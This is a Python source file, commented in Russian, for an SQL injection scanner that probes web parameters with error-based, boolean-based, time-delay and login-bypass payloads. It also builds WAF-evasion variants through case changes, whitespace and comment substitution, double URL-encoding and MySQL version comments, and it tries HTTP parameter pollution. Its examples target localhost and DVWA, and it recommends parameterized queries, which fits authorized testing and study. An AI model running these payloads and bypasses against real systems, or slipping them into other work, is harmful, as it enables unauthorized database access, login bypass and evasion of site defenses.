"""Архивный детектор SQLi на httpx."""

from __future__ import annotations

import asyncio
import random
import re
import string
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qsl

import httpx



class Severity(str, Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class ScanTarget:
    url: str
    method: str = "GET"
    params: dict[str, str] = field(default_factory=dict)   # GET-параметры
    data: dict[str, str] = field(default_factory=dict)     # POST body
    cookies: dict[str, str] = field(default_factory=dict)
    headers: dict[str, str] = field(default_factory=dict)
    content_type: str = "form"   # "form" | "json" — как кодировать POST body


@dataclass
class Finding:
    vuln_type: str
    param: str
    url: str
    severity: Severity
    confidence: float          # 0.0 - 1.0
    method_used: str           # "error-based" / "boolean-based" / "time-based"
    evidence: str
    recommendation: str



DB_ERROR_SIGNATURES = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysqli?",
    r"valid MySQL result",
    r"PostgreSQL.*ERROR",
    r"Npgsql\.",
    r"pg_query\(\)",
    r"ORA-\d{5}",
    r"Microsoft OLE DB Provider for ODBC Drivers",
    r"Microsoft SQL Native Client error",
    r"SQLSTATE\[\d+\]",
    r"SQLite3::query",
    r"sqlite3\.OperationalError",
    r"unclosed quotation mark after the character string",
]

ERROR_PAYLOADS = ["'", "\"", "' OR '1'='1", "')", "';--", "\";--"]


class InjectionContext(str, Enum):
    """Куда подставляется payload — от этого зависит синтаксис."""
    NUMERIC = "numeric"       # id=1  (без кавычек)
    STRING_SINGLE = "string_single"   # name='admin'
    STRING_DOUBLE = "string_double"   # name="admin"
    LIKE = "like"             # search LIKE '%term%'


def guess_context(value: str) -> InjectionContext:
    """Грубая эвристика по исходному значению параметра."""
    if re.fullmatch(r"-?\d+(\.\d+)?", value):
        return InjectionContext.NUMERIC
    return InjectionContext.STRING_SINGLE


# comment-стили под разные СУБД (важно: MySQL требует пробел после --)
COMMENTS = ["-- -", "#", "/*"]

# boolean-based пары: (true-условие, false-условие), с учётом контекста
def build_boolean_payloads(ctx: InjectionContext) -> list[tuple[str, str]]:
    """Пары логических условий для заданного контекста."""
    pairs = []
    for comment in COMMENTS:
        if ctx == InjectionContext.NUMERIC:
            pairs.append((f" OR 1=1{comment}", f" AND 1=2{comment}"))
            pairs.append((f") OR (1=1{comment}", f") AND (1=2{comment}"))  # на случай скобок
            pairs.append((f" || 1=1{comment}", f" && 1=2{comment}"))       # символьные операторы
        elif ctx == InjectionContext.STRING_SINGLE:
            pairs.append((f"' OR '1'='1'{comment}", f"' AND '1'='2'{comment}"))
            pairs.append((f"' OR 1=1{comment}", f"' AND 1=2{comment}"))
            pairs.append((f"' || '1'='1'{comment}", f"' && '1'='2'{comment}"))
        elif ctx == InjectionContext.STRING_DOUBLE:
            pairs.append((f"\" OR \"1\"=\"1\"{comment}", f"\" AND \"1\"=\"2\"{comment}"))
        elif ctx == InjectionContext.LIKE:
            pairs.append((f"%' OR '1'='1'{comment}", f"%' AND '1'='2'{comment}"))
    return pairs


# Некоторые стеки по-разному обрабатывают дублирующиеся параметры:
# WAF может анализировать только первое вхождение, а бэкенд — брать последнее (или наоборот,
# либо склеивать через запятую). Из-за этого payload во втором вхождении может
# "проскочить" мимо фильтра, но всё равно попасть в SQL-запрос на бэкенде.
def build_hpp_values(base_values: dict[str, str], param: str, payload: str) -> list[tuple[str, Any]]:
    """
    Возвращает варианты значения параметра для send() в виде, пригодном для httpx,
    где дублирующиеся ключи передаются списком: params={"id": ["1", "' OR '1'='1"]}
    """
    clean_value = base_values.get(param, "")
    return [
        (f"{param}__hpp_last", [clean_value, clean_value + payload]),   # чистое, потом payload
        (f"{param}__hpp_first", [clean_value + payload, clean_value]),  # payload, потом чистое
    ]


# альтернативные логические операторы — некоторые WAF фильтруют именно слова OR/AND,
# но пропускают символьные операторы или другие ключевые слова с тем же эффектом
ALT_TRUE_OPERATORS = ["OR", "||", "OR", "LIKE"]   # для true-условий (LIKE '1' подходит в некоторых контекстах)
ALT_FALSE_OPERATORS = ["AND", "&&", "AND"]

# whitespace-обфускация: чем заменяем обычный пробел
WHITESPACE_VARIANTS = [" ", "%09", "%0A", "%0D", "/**/", "%0C"]


def _whitespace_bypass(payload: str) -> list[str]:
    """Заменяет все пробелы в payload на альтернативные разделители по очереди."""
    results = []
    for ws in WHITESPACE_VARIANTS[1:]:  # пропускаем обычный пробел — он и так есть в payload
        results.append(payload.replace(" ", ws))
    return results


def _version_comment_variant(payload: str) -> str | None:
    """
    MySQL-специфичный inline version comment: /*!50000 OR 1=1*/
    Код внутри выполняется СУБД, но многие сигнатурные WAF видят просто /*...*/ как обычный комментарий
    и не разбирают содержимое.
    """
    match = re.search(r"\b(OR|AND)\b(.+)", payload, re.IGNORECASE)
    if not match:
        return None
    prefix = payload[: match.start()]
    return f"{prefix}/*!50000 {match.group(0)}*/"


# базовые WAF-evasion вариации для error-based проб (детектирование, без цели обхода полноценной защиты —
# цель: не терять уязвимость на простейших сигнатурных фильтрах, это стандартная часть detection-логики)
def waf_evasion_variants(payload: str) -> list[str]:
    variants = [payload]

    # вариация регистра ключевых слов
    variants.append(re.sub(r"\bOR\b", "Or", payload, flags=re.IGNORECASE))
    variants.append(re.sub(r"\bOR\b", "oR", payload, flags=re.IGNORECASE))
    variants.append(re.sub(r"\bAND\b", "AnD", payload, flags=re.IGNORECASE))

    # whitespace bypass (табы, переводы строк, инлайн-комментарии вместо пробела)
    variants.extend(_whitespace_bypass(payload))

    # двойное URL-кодирование — актуально, когда между клиентом и бэкендом есть
    # промежуточный декодер (прокси/WAF), который снимает только один слой кодирования
    variants.append(payload.replace(" ", "%2520").replace("'", "%2527"))

    # версионный комментарий MySQL
    version_variant = _version_comment_variant(payload)
    if version_variant:
        variants.append(version_variant)

    return list(dict.fromkeys(variants))  # убираем дубликаты, сохраняя порядок

# time-based: СУБД-специфичные
TIME_PAYLOADS = {
    "mysql": "' OR SLEEP(5)-- -",
    "postgres": "'; SELECT pg_sleep(5)-- -",
    "mssql": "'; WAITFOR DELAY '0:0:5'--",
}

TIME_THRESHOLD = 4.5   # секунд — если ответ дольше, считаем подозрительным
BASELINE_REQUESTS = 2  # сколько раз мерить baseline, чтобы не словить случайный лаг


def _cache_bust(payload: str) -> str:
    """Повторная проверка требует отдельного запроса к БД."""
    token = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{payload} {token}"



AUTH_LOGIN_PARAM_NAMES = {"email", "username", "user", "login", "uid"}
AUTH_SUCCESS_INDICATORS = ["token", "jwt", "access_token", "sessionid", "authentication", "auth_token"]

AUTH_BYPASS_PAYLOADS = [
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' OR '1'='1'-- -",
    "admin'-- -",
    "' OR 'a'='a",
]


class SqliDetector:
    def __init__(self, client: httpx.AsyncClient, timeout: float = 10.0, request_delay: float = 0.0):
        self.client = client
        self.timeout = timeout
        self.request_delay = request_delay  # пауза перед КАЖДЫМ запросом — защита от rate-limit/anti-automation
        self._current_noise_floor = 0  # выставляется в scan() на основе baseline-замера

    async def scan(self, target: ScanTarget) -> list[Finding]:
        findings: list[Finding] = []

        parsed = urlparse(target.url)
        url_params = dict(parse_qsl(parsed.query))
        all_params = {**url_params, **target.params, **target.data}

        if not all_params:
            return findings

        # baseline-замер времени И естественного "шума" длины ответа (для boolean-based)
        baseline, noise_floor = await self._measure_baseline(target)
        self._current_noise_floor = noise_floor  # используется в _responses_differ

        for param_name in all_params:
            finding = await self._test_param(target, param_name, all_params, baseline)
            if finding:
                findings.append(finding)

        return findings

    async def _measure_baseline(self, target: ScanTarget) -> tuple[float, int]:
        """
        Возвращает (baseline_time, noise_floor).
        noise_floor — на сколько байт естественно "гуляет" длина ответа между
        двумя НЕИЗМЕНЁННЫМИ запросами (CSRF-токены, динамические вставки,
        порядок полей и т.п.), ещё до какой-либо инъекции. Без этого
        boolean-based легко словит такой шум как "разницу true/false" —
        именно это произошло на DVWA: одна и та же разница в ~50 байт
        повторялась на совершенно разных страницах, что выдавало в ней не
        признак SQLi, а просто фоновую изменчивость страницы.
        """
        timings = []
        lengths = []
        for _ in range(BASELINE_REQUESTS):
            start = time.monotonic()
            resp = await self._send(target, target.params if target.method == "GET" else target.data)
            timings.append(time.monotonic() - start)
            if resp is not None:
                lengths.append(len(resp.text))

        baseline_time = max(timings)  # худший случай, чтобы не ловить ложные срабатывания по времени
        noise_floor = (max(lengths) - min(lengths)) if len(lengths) >= 2 else 0
        return baseline_time, noise_floor

    async def _test_param(
        self,
        target: ScanTarget,
        param: str,
        base_values: dict[str, str],
        baseline_time: float,
    ) -> Finding | None:

        original_value = base_values.get(param, "")
        ctx = guess_context(original_value)

        auth_finding = await self._test_auth_bypass(target, param, base_values)
        if auth_finding:
            return auth_finding

        all_error_payloads = []
        for p in ERROR_PAYLOADS:
            all_error_payloads.extend(waf_evasion_variants(p))

        for payload in all_error_payloads:
            values = {**base_values, param: original_value + payload}
            resp = await self._send(target, values)
            if resp is None:
                continue
            for pattern in DB_ERROR_SIGNATURES:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    return Finding(
                        vuln_type="SQL Injection",
                        param=param,
                        url=target.url,
                        severity=Severity.HIGH,
                        confidence=0.9,
                        method_used="error-based",
                        evidence=f"payload={payload!r}, matched pattern={pattern!r}",
                        recommendation="Используйте параметризованные запросы / prepared statements.",
                    )

        for true_payload, false_payload in build_boolean_payloads(ctx):
            true_values = {**base_values, param: original_value + true_payload}
            false_values = {**base_values, param: original_value + false_payload}

            true_resp = await self._send(target, true_values)
            false_resp = await self._send(target, false_values)

            if true_resp is None or false_resp is None:
                continue

            if not self._responses_differ(true_resp, false_resp):
                continue

            # confirmation: повторяем ту же пару ещё раз — отсекаем случайный шум
            # (динамический контент, счётчики, A/B-тесты на стороне сервера и т.п.)
            true_resp2 = await self._send(target, true_values)
            false_resp2 = await self._send(target, false_values)
            confirmed = (
                true_resp2 is not None
                and false_resp2 is not None
                and self._responses_differ(true_resp2, false_resp2)
            )

            return Finding(
                vuln_type="SQL Injection",
                param=param,
                url=target.url,
                severity=Severity.HIGH,
                confidence=0.85 if confirmed else 0.5,
                method_used="boolean-based" + ("" if confirmed else " (неподтверждено повторно)"),
                evidence=(
                    f"true_payload={true_payload!r} len={len(true_resp.text)} "
                    f"vs false_payload={false_payload!r} len={len(false_resp.text)}; "
                    f"confirmed={confirmed}"
                ),
                recommendation="Используйте параметризованные запросы / prepared statements.",
            )

        for true_payload, false_payload in build_boolean_payloads(ctx)[:1]:  # одной пары достаточно
            for variant_name, hpp_true in build_hpp_values(base_values, param, true_payload):
                hpp_false_pairs = build_hpp_values(base_values, param, false_payload)
                hpp_false = dict(hpp_false_pairs)[variant_name]

                true_values = {**base_values, param: hpp_true}
                false_values = {**base_values, param: hpp_false}

                true_resp = await self._send(target, true_values)
                false_resp = await self._send(target, false_values)

                if true_resp is None or false_resp is None:
                    continue

                if self._responses_differ(true_resp, false_resp):
                    return Finding(
                        vuln_type="SQL Injection",
                        param=param,
                        url=target.url,
                        severity=Severity.HIGH,
                        confidence=0.6,  # ниже, т.к. HPP-сигнал сам по себе менее надёжен
                        method_used=f"boolean-based (HPP: {variant_name})",
                        evidence=f"hpp_true={hpp_true!r} vs hpp_false={hpp_false!r}",
                        recommendation="Используйте параметризованные запросы; проверьте обработку дублирующихся параметров.",
                    )

        for db_name, base_payload in TIME_PAYLOADS.items():
            payload = _cache_bust(base_payload)
            values = {**base_values, param: base_values.get(param, "") + payload}
            start = time.monotonic()
            resp = await self._send(target, values)
            elapsed = time.monotonic() - start

            if resp is None or elapsed - baseline_time < TIME_THRESHOLD:
                continue

            # confirmation: повторяем С ДРУГИМ cache-bust токеном — иначе дословно
            # повторенный запрос может прилететь из query cache СУБД и ошибочно
            # выглядеть как "не подтвердилось", хотя уязвимость настоящая
            confirm_payload = _cache_bust(base_payload)
            confirm_values = {**base_values, param: base_values.get(param, "") + confirm_payload}
            start2 = time.monotonic()
            resp2 = await self._send(target, confirm_values)
            elapsed2 = time.monotonic() - start2
            confirmed = resp2 is not None and (elapsed2 - baseline_time >= TIME_THRESHOLD)

            return Finding(
                vuln_type="SQL Injection",
                param=param,
                url=target.url,
                severity=Severity.CRITICAL,
                confidence=0.9 if confirmed else 0.5,
                method_used="time-based" + ("" if confirmed else " (неподтверждено повторно)"),
                evidence=(
                    f"db_guess={db_name}, baseline={baseline_time:.2f}s, "
                    f"elapsed_1={elapsed:.2f}s, elapsed_2={elapsed2:.2f}s, confirmed={confirmed}"
                ),
                recommendation="Используйте параметризованные запросы / prepared statements.",
            )

        return None

    async def _test_auth_bypass(
        self, target: ScanTarget, param: str, base_values: dict[str, str]
    ) -> Finding | None:
        if param.lower() not in AUTH_LOGIN_PARAM_NAMES:
            return None
        password_key = next((k for k in base_values if k.lower() == "password"), None)
        if password_key is None:
            return None  # нет поля пароля рядом — это не форма логина

        # baseline: заведомо неверные креды. Если baseline САМ выглядит как
        # успешный логин — значит наш детектор успеха неверно откалиброван
        # под это приложение, и делать вывод нельзя (лучше промолчать, чем соврать)
        baseline_values = {
            **base_values,
            param: "definitely_not_a_real_user_x1z9",
            password_key: "definitely_wrong_password_x1z9",
        }
        baseline_resp = await self._send(target, baseline_values)
        if baseline_resp is None or self._looks_like_auth_success(baseline_resp):
            return None

        for payload in AUTH_BYPASS_PAYLOADS:
            values = {**base_values, param: payload}
            resp = await self._send(target, values)
            if resp is None or not self._looks_like_auth_success(resp):
                continue

            resp2 = await self._send(target, values)
            confirmed = resp2 is not None and self._looks_like_auth_success(resp2)

            return Finding(
                vuln_type="SQL Injection (Authentication Bypass)",
                param=param,
                url=target.url,
                severity=Severity.CRITICAL,
                confidence=0.9 if confirmed else 0.6,
                method_used="auth-bypass-heuristic" + ("" if confirmed else " (неподтверждено повторно)"),
                evidence=(
                    f"payload={payload!r} вернул признак успешной аутентификации "
                    f"(status={resp.status_code}), baseline с заведомо неверными кредами — нет; "
                    f"confirmed={confirmed}"
                ),
                recommendation=(
                    "Используйте параметризованные запросы / ORM-методы при проверке логина, "
                    "не формируйте SQL конкатенацией строк из email/username."
                ),
            )
        return None

    @staticmethod
    def _looks_like_auth_success(resp: httpx.Response) -> bool:
        if resp.status_code not in (200, 201):
            return False
        try:
            data = resp.json()
        except ValueError:
            return False
        text = str(data).lower()
        return any(indicator in text for indicator in AUTH_SUCCESS_INDICATORS)

    async def _send(self, target: ScanTarget, values: dict[str, Any]) -> httpx.Response | None:
        if self.request_delay > 0:
            await asyncio.sleep(self.request_delay)

        # У каждой цели свой заголовок Cookie при общем HTTP-клиенте.
        headers = dict(target.headers)
        if target.cookies:
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in target.cookies.items())

        try:
            if target.method.upper() == "GET":
                parsed = urlparse(target.url)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                return await self.client.get(
                    base_url,
                    params=values,
                    headers=headers,
                    timeout=self.timeout,
                )
            elif target.content_type == "json":
                return await self.client.post(
                    target.url,
                    json=values,
                    headers=headers,
                    timeout=self.timeout,
                )
            else:
                return await self.client.post(
                    target.url,
                    data=values,
                    headers=headers,
                    timeout=self.timeout,
                )
        except httpx.TimeoutException:
            return None
        except httpx.HTTPError:
            return None

    def _responses_differ(self, true_resp: httpx.Response, false_resp: httpx.Response) -> bool:
        if true_resp.status_code != false_resp.status_code:
            return True
        len_diff = abs(len(true_resp.text) - len(false_resp.text))
        # базовый порог в % от длины ответа + запас сверх измеренного фонового
        # "шума" страницы (noise_floor) — иначе естественная изменчивость
        # страницы (CSRF-токены и т.п.) засчитывается как признак SQLi
        base_threshold = max(20, int(0.02 * len(true_resp.text)))
        threshold = max(base_threshold, int(self._current_noise_floor * 1.5))
        return len_diff > threshold



def build_target_from_cli(url: str, cookie: str | None, param: str | None) -> ScanTarget:
    """
    Пример: python sqli_detector.py "http://localhost/vuln.php?id=1" --cookie "PHPSESSID=abc; security=low"
    """
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if param and param not in params:
        params[param] = "1"  # если параметр не передан в URL, добавляем вручную

    cookies = {}
    if cookie:
        for pair in cookie.split(";"):
            if "=" in pair:
                k, v = pair.strip().split("=", 1)
                cookies[k] = v

    return ScanTarget(url=url, method="GET", params=params, cookies=cookies)



import json


def load_targets_from_file(path: str) -> list[ScanTarget]:
    """
    Формат targets.json:
    [
      {
        "url": "http://localhost/dvwa/vulnerabilities/sqli/",
        "method": "GET",
        "params": {"id": "1", "Submit": "Submit"},
        "cookies": {"PHPSESSID": "abc", "security": "low"}
      },
      {
        "url": "http://localhost/api/search",
        "method": "POST",
        "data": {"query": "test"}
      }
    ]
    """
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)

    targets = []
    for item in raw:
        targets.append(ScanTarget(
            url=item["url"],
            method=item.get("method", "GET"),
            params=item.get("params", {}),
            data=item.get("data", {}),
            cookies=item.get("cookies", {}),
            headers=item.get("headers", {}),
        ))
    return targets



async def run_single(target: ScanTarget):
    async with httpx.AsyncClient(follow_redirects=True) as client:
        detector = SqliDetector(client)
        findings = await detector.scan(target)

        if not findings:
            print(f"[{target.url}] уязвимостей не найдено")
            return

        for f in findings:
            print(f"[{f.severity.upper()}] {f.vuln_type} in '{f.param}' "
                  f"({f.method_used}, confidence={f.confidence})")
            print(f"  evidence: {f.evidence}")


async def run_many(targets: list[ScanTarget]):
    # сканируем цели параллельно, но с ограничением одновременных соединений,
    # чтобы не задудосить тестовый сервер
    sem = asyncio.Semaphore(5)

    async def bounded_scan(client: httpx.AsyncClient, target: ScanTarget):
        async with sem:
            detector = SqliDetector(client)
            return target.url, await detector.scan(target)

    async with httpx.AsyncClient(follow_redirects=True) as client:
        results = await asyncio.gather(*(bounded_scan(client, t) for t in targets))

    for url, findings in results:
        if not findings:
            print(f"[{url}] уязвимостей не найдено")
            continue
        for f in findings:
            print(f"[{url}] [{f.severity.upper()}] {f.vuln_type} in '{f.param}' "
                  f"({f.method_used}, confidence={f.confidence})")


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1].endswith(".json"):
        # python sqli_detector.py targets.json
        targets = load_targets_from_file(sys.argv[1])
        asyncio.run(run_many(targets))
    elif len(sys.argv) > 1:
        # python sqli_detector.py "http://localhost/vuln.php?id=1" "PHPSESSID=abc; security=low"
        url = sys.argv[1]
        cookie = sys.argv[2] if len(sys.argv) > 2 else None
        target = build_target_from_cli(url, cookie, param=None)
        asyncio.run(run_single(target))
    else:
        print("Использование:")
        print('  python sqli_detector.py "http://host/path?id=1" ["cookie_string"]')
        print("  python sqli_detector.py targets.json")